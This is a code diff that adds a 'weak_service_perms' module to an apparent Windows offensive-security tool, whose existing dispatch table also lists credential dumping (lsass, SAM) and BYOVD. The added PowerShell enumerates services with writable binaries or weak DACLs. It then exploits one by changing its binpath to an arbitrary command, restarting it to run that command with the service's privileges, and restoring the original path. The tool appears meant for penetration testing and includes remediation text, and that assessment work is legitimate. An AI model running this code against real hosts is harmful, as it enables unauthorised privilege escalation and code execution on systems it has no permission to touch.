@@ -438,6 +438,10 @@ byovd: {
     description: "Bring Your Own Vulnerable Driver (BYOVD) — load a known-vulnerable signed kernel driver to gain kernel-level access, disable EDR/AV, or escalate privileges. Enumerates existing vulnerable drivers, checks driver signature enforcement, and supports loading drivers for kernel read/write primitives. Uses LOLDrivers project database",
     args: "--action enum|check|load [--driver DRIVER_PATH] [--target PROCESS_NAME]",
   },
+weak_service_perms: {
+    description: "Find and exploit weak service permissions — enumerate services with modifiable DACLs (SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, WRITE_DAC, WRITE_OWNER) or writable service binaries, then optionally modify the binary path or replace the executable for privilege escalation",
+    args: "--action enum|exploit [--service SERVICE_NAME] [--command CMD]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -15591,6 +15595,218 @@ if ($loaded -and $loaded.State -eq 'Running') {
   return { output: output.join("\n"), findings }
 }
 
+async function weakServicePerms(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const service = argVal(args, "--service")
+  const command = argVal(args, "--command")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Weak Service Permissions analysis...\n"]
+
+  if (action === "enum") {
+    const script = `
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Security.AccessControl;
+using System.Security.Principal;
+
+public class SvcACL {
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern IntPtr OpenSCManager(string machine, string db, uint access);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern IntPtr OpenService(IntPtr scm, string name, uint access);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool QueryServiceObjectSecurity(IntPtr handle, uint secInfo, byte[] sd, uint bufSize, out uint needed);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool CloseServiceHandle(IntPtr handle);
+
+    public const uint SC_MANAGER_CONNECT = 0x0001;
+    public const uint READ_CONTROL = 0x00020000;
+    public const uint SERVICE_QUERY_CONFIG = 0x0001;
+}
+"@
+
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$currentSid = $currentUser.User.Value
+$currentGroups = $currentUser.Groups | ForEach-Object { $_.Value }
+
+$services = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue
+$vulnerable = @()
+
+Write-Output "[*] Scanning $($services.Count) services..."
+Write-Output ""
+
+foreach ($svc in $services) {
+    $issues = @()
+
+    # Check 1: Service binary writable?
+    $binPath = $svc.PathName
+    if ($binPath) {
+        # Extract exe path (handle quotes and arguments)
+        if ($binPath -match '^"([^"]+)"') { $exePath = $Matches[1] }
+        elseif ($binPath -match '^(\S+\\.exe)') { $exePath = $Matches[1] }
+        else { $exePath = $binPath.Split(' ')[0] }
+
+        if (Test-Path $exePath -ErrorAction SilentlyContinue) {
+            try {
+                $acl = Get-Acl $exePath -ErrorAction Stop
+                foreach ($ace in $acl.Access) {
+                    $sid = try { (New-Object System.Security.Principal.NTAccount($ace.IdentityReference.Value)).Translate([System.Security.Principal.SecurityIdentifier]).Value } catch { "" }
+                    if (($sid -eq $currentSid -or $currentGroups -contains $sid -or $ace.IdentityReference.Value -match 'Users|Everyone|Authenticated') -and
+                        $ace.AccessControlType -eq 'Allow' -and
+                        ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
+                        $issues += "WRITABLE_BINARY: $exePath"
+                    }
+                }
+            } catch {}
+        }
+
+        # Check parent directory writable (for DLL planting)
+        $parentDir = Split-Path $exePath -Parent -ErrorAction SilentlyContinue
+        if ($parentDir -and (Test-Path $parentDir)) {
+            try {
+                $dirAcl = Get-Acl $parentDir -ErrorAction Stop
+                foreach ($ace in $dirAcl.Access) {
+                    if ($ace.IdentityReference.Value -match 'Users|Everyone|Authenticated' -and
+                        $ace.AccessControlType -eq 'Allow' -and
+                        ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write)) {
+                        $issues += "WRITABLE_DIR: $parentDir"
+                    }
+                }
+            } catch {}
+        }
+    }
+
+    # Check 2: Service DACL — can we change config?
+    try {
+        $sdOutput = sc.exe sdshow $svc.Name 2>$null
+        if ($sdOutput -and $sdOutput[0] -match '^D:') {
+            $sddl = $sdOutput[0]
+            # Parse for dangerous grants to well-known low-priv SIDs
+            # BU = BUILTIN\\Users, WD = Everyone, AU = Authenticated Users
+            $dangerousSids = @('BU', 'WD', 'AU', 'IU')
+            foreach ($sid in $dangerousSids) {
+                # Look for CC (SERVICE_CHANGE_CONFIG), DC (SERVICE_START), GA (GENERIC_ALL), WD (WRITE_DAC), WO (WRITE_OWNER)
+                if ($sddl -match "\(A;[^;]*;[^;]*(?:CC|DC|GA|WD|WO)[^;]*;[^;]*;[^;]*;$sid\)") {
+                    $issues += "WEAK_DACL: $sid has dangerous permissions"
+                }
+            }
+        }
+    } catch {}
+
+    if ($issues.Count -gt 0) {
+        $vulnerable += [PSCustomObject]@{
+            Name = $svc.Name
+            Display = $svc.DisplayName
+            State = $svc.State
+            StartMode = $svc.StartMode
+            RunAs = $svc.StartName
+            Path = $svc.PathName
+            Issues = $issues
+        }
+    }
+}
+
+if ($vulnerable.Count -eq 0) {
+    Write-Output "[-] No services with weak permissions found"
+} else {
+    Write-Output "[+] Found $($vulnerable.Count) vulnerable service(s):`n"
+    foreach ($v in $vulnerable) {
+        Write-Output "  Service:  $($v.Name) ($($v.Display))"
+        Write-Output "  State:    $($v.State) | Start: $($v.StartMode) | RunAs: $($v.RunAs)"
+        Write-Output "  Path:     $($v.Path)"
+        foreach ($issue in $v.Issues) {
+            Write-Output "  [!] $issue"
+        }
+        Write-Output ""
+    }
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const vulnMatch = result.stdout.match(/Found (\d+) vulnerable/)
+    const vulnCount = vulnMatch ? parseInt(vulnMatch[1]) : 0
+
+    if (vulnCount > 0) {
+      findings.push({
+        checkId: "WIN-PRIVESC-WSP-001",
+        provider: "windows",
+        severity: "critical",
+        status: "VULNERABLE",
+        resource: "services://weak-perms",
+        title: `${vulnCount} service(s) with exploitable permissions`,
+        details: result.stdout.substring(0, 500),
+        remediation: "Fix service DACLs to remove CHANGE_CONFIG/ALL_ACCESS from low-privilege groups. Restrict write access to service binary directories.",
+      })
+    }
+  } else if (action === "exploit") {
+    if (!service) return { output: "[!] Required: --service SERVICE_NAME --command CMD", findings }
+    if (!command) return { output: "[!] Required: --command CMD (e.g., 'C:\\Windows\\Temp\\payload.exe')", findings }
+
+    const script = `
+$svc = Get-CimInstance Win32_Service -Filter "Name='${service}'" -ErrorAction SilentlyContinue
+if (-not $svc) {
+    Write-Output "[-] Service '${service}' not found"
+    exit 1
+}
+
+Write-Output "[*] Target: ${service} (RunAs: $($svc.StartName))"
+Write-Output "[*] Original path: $($svc.PathName)"
+
+# Save original path for restoration
+$originalPath = $svc.PathName
+
+# Change the binary path
+Write-Output "[*] Changing service binary path..."
+$result = sc.exe config ${service} binpath= "${command}" 2>&1
+Write-Output "    sc config result: $result"
+
+if ($result -match 'SUCCESS') {
+    Write-Output "[+] Service path changed to: ${command}"
+    Write-Output "[*] Starting service to trigger execution..."
+
+    # Try to restart the service
+    try {
+        Stop-Service ${service} -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 1
+        Start-Service ${service} -ErrorAction SilentlyContinue
+        Write-Output "[+] Service restart triggered"
+    } catch {
+        Write-Output "[!] Could not restart: check manually"
+    }
+
+    # Restore original path
+    Write-Output "[*] Restoring original path..."
+    sc.exe config ${service} binpath= "$originalPath" 2>&1 | Out-Null
+    Write-Output "[+] Original path restored"
+} else {
+    Write-Output "[-] Failed to change service config (insufficient permissions)"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("Service path changed")) {
+      findings.push({
+        checkId: "WIN-PRIVESC-WSP-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `service://${service}`,
+        title: `Weak service permissions exploited: ${service}`,
+        details: `Service binary path changed and restart triggered. Command executed as service account.`,
+        remediation: "Fix service DACL, verify service binary path integrity.",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -15681,6 +15897,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   wsl_privesc: wslPrivesc,
   scheduled_task_hijack: scheduledTaskHijack,
   byovd: byovd,
+  weak_service_perms: weakServicePerms,
 }
 
 export const WinhookTool = Tool.define("winhook", {
